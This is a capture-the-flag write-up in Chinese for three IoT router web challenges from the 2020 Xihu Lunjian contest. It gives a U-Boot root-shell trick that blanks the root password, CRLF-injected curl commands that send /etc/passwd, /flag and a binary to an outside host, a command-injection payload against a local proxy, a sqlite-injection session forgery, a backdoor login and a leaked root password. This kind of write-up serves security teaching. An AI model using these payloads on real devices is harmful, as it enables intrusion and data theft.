# 西湖论剑2020-IoT闯关赛-WEB-WriteUp

[toc]

## 获取设备shell
按reset重启，然后串口工具中快速按回车进入uboot，输入如下两条命令，长的命令需要多次复制   

```
=> setenv bootargs_common "console=ttyS0,115200 earlyprintk rootwait init=/bin/sh consoleblank=0 net.ifnames=0 biosdevname=0 rootfstype=jffs2"
=> boot
```

启动后进入没有题目的root shell，此时板子还没有ip地址，直接复制如下命令（全部复制），粘贴到shell里：   

```
#!/bin/sh
mount proc /proc -t proc
set -- $(cat /proc/cmdline)
umount /proc
for x in "$@"; do
    case "$x" in
        overlayfsdev=*)
        OVERLAYFSDEV="${x#overlayfsdev=}"
        mtd erase /dev/mtd5
        mount -n -t jffs2 ${OVERLAYFSDEV} -o rw,noatime /overlay
        mkdir -p /overlay/rom/lower /overlay/rom/upper /overlay/rom/work
        mount -n -t overlay overlayfs:/overlay/rom -o rw,noatime,lowerdir=/,upperdir=/overlay/rom/upper,workdir=/overlay/rom/work /tmp
        mount --rbind /dev /tmp/dev/
        mount --rbind /overlay /tmp/overlay/
        mount --rbind / /tmp/overlay/rom/lower
        echo "root::::::::" > /tmp/etc/shadow
        exec chroot /tmp /sbin/init
        ;;
    esac
done
exec /sbin/init
```

然后用root，空密码应该就可以登录了，此时板子`20.20.11.14`应该已经可以ping通了    

## IoT-Web1 版本更新
>题目说明:路由器在检测版本更新的过程中，出现了一个意料之外的问题。题目端口80（flag在根目录或者/workspace下）   

### 思路
出题人没有给固件或者binary，考点是黑盒测试。   
但是IoT设备的安全研究可以通过很多方法获取到固件或者shell，例如上述的方法获得了shell，该题的难度就大大降低了。   

### 分步解答

#### （1）参数注入
通过admin：admin就可以登录后台，跳转到 `http://20.20.11.14/checkupdate.php?url=firmware.bin`,没有其它的页面内容了，也就是说入口点就这一个`url`参数。   
拿到shell后我们可以看到代码如下：   
```php
<?php

// session_start();

print "Content-type: text/html; charset=utf-8\n\n";
// if(empty($_SESSION['name'])){
//     echo "login first";
    //exit();
    //whataver  just do it lucky guy
// }
$url =$_ENV['CGI_URL'];


$cmd = "curl http://x11router.com/".$url." -o /tmp/test.bin ";
$cmd = escapeshellcmd($cmd);
#echo $cmd."\n";
shell_exec($cmd);
echo "Done";

//when we can't unpack the firmware or no firmware, we usually pentest to get shell first.
//hint : do u know rpc on this server ? get root shell
```
主要就是curl参数注入漏洞，需要逃逸escapeshellcmd()检测，一个思路[参数注入逃逸](https://www.mi1k7ea.com/2019/07/04/%E6%B5%85%E8%B0%88escapeshellarg%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/)，通过注入相关参数进行利用；二是通过%0d%0a换行进行分割逃逸执行命令。   
后续的利用主要通过%0d%0a。   
文件读取 PoC。   
`http://20.20.11.14/checkupdate.php?url=%0d%0acurl http://20.20.11.13:8000/ -X POST --data @/etc/passwd`   
读取flag读取不出，通过checkupdage.php最后两行提示也说明，当前用户没有权限读取flag，需要我们找个其它进程提高权限。   

#### （2）寻找rpc高权限进程
黑盒的方式，可能要/proc/pid/cmdline遍历查找高权限的进程。   
如果拿到shell，ps就可以发现，executeproxynew   
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/xhlj-2020-iot/images/iot_web_1_ps.png)
本地开放9998端口   
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/xhlj-2020-iot/images/iot_web_1_netstat.png)
我们可以通过 `http://20.20.11.14/checkupdate.php?url=%0d%0acurl http://20.20.11.13:8000/ -F "file=@/workspace/data/executeproxynew"` 将binary传出来进行分析。


#### （3）逆向分析executeproxynew
该程序监听在9998的tcp端口，需要过个认证，提取命令执行，前两个字节看出题人的意图是后面payload的长度，但最后是取地址，数值会很大，所以任意两位就可。   
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/xhlj-2020-iot/images/iot_web_1_bin.png)
最终执行的PoC：   
`11P4ss1:whoami|whomai|whomai|touch /tmp/re|`   

#### （4）利用链
通过上述方法，我先通过curl -X发送到9998端口执行`chmod 777 /flag`，然后在通过curl读取flag。   
修改权限：   
`http://20.20.11.14/checkupdate.php?url=%0d%0acurl http://127.0.0.1:9998/ -X "12P4ss1:whoami|whomai|whomai|whoami|chmod 777 /flag|"`
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/xhlj-2020-iot/images/iot_web_1_chmod.png)   
读取flag   
`http://20.20.11.14/checkupdate.php?url=%0d%0acurl http://20.20.11.13:8000/ -X POST --data @/flag`
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/xhlj-2020-iot/images/iot_web_1_flag.png)


## IoT-Web2 伪造登录
>题目说明:成为管理员就可以读取flag,题目端口80（flag在根目录或者/workspace下）

### 思路
提给出了3个binary，data.out,login.out,readflag.out，需要获得管理权限，然后运行readflag.out读取flag。   
### 分步解答
#### （1）login.out分析
name，pass参数传递用户名和密码。   
判断用户名和密码hash都写死了，之后生成个`/tmp/sess_xxx`作为session缓存。   
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/xhlj-2020-iot/images/iot_web_2_login.png)
#### （2）data.out分析
这个文件存在命令注入，可以读取序列号shln12345678，和主页显示的序列号shlj12345678不一样，一度这点误导一直在通过序列号进行密码拼接碰撞hash密码。   
其实想通过sqlite注入写文件，用户名和密码又是写死的，感觉这硬拼凑在一起的，毫无逻辑关系。   
#### （3）readflag.out 分析
这块判断sesion时候，是在1024字节内是否有`:`，然后判断后面字符是否admin，这个逻辑点也有点牵强，正常attach的sqlite的数据库大小超过1024字节了，保存的user:admin字符就在1024字节后。   
需要限制数据库的大小，通过`page_size=512;`可以限制到1024。   
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/xhlj-2020-iot/images/iot_web_2_readflag.png) 
#### （4）利用链
通过sqlite注入写session缓存文件。   
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/xhlj-2020-iot/images/iot_web_2_2.png)
在设置cookie去读取flag。
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/xhlj-2020-iot/images/iot_web_2_1.png)

## IoT-web3 后门账号（未完待续）
>题目说明:路由器管理后台被攻陷，运维加了个访问认证，可惜中间件被黑客植入了后门账号。题目端口80（flag在根目录或者/workspace下）

### 思路
### 思路
登录发现，该网站主要通过basic认证方式，appweb中间件，需要找到认证后门。一是直接定位相关认证逻辑代码。可以对比源码来寻找差别。二是直接编译appweb进行bindiff查找不同。      

### 分步解答
### （1）认证后门
我们可以通过CVE-2018-8715发现，验证逻辑代码函数httpLogin()。
* [ AppWeb认证绕过漏洞（CVE-2018-8715）](https://www.wangan.com/docs/266)
* [CVE-2018-8715分析](https://forum.90sec.com/t/topic/512)
* [appweb源码下载](https://s3.amazonaws.com/embedthis.public/appweb-src.tgz)

在libhttp.so中，添加了一句，只要第二位开始是Mon就可以绕过认证。   aMondmin:123456
![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/xhlj-2020-iot/images/iot_web_3_httplogin.png)

### （2）php包含漏洞
index.php
```php
<?php
print "Content-type: text/html; charset=utf-8\n\n";
echo "<script> document.location.href='action.php?action=echo.php';</script>";

```
atcion.php
```php
<?php
print "Content-type: text/html; charset=utf-8\n\n";

$d=$_ENV['CGI_ACTION'];
include $d;
```
echo.php
```php
<?php
    echo "<center><h1>very easy dont think too much</h1></center>";
```
## other
比赛后提供了固件的root密码：1864a64aa761b0e4
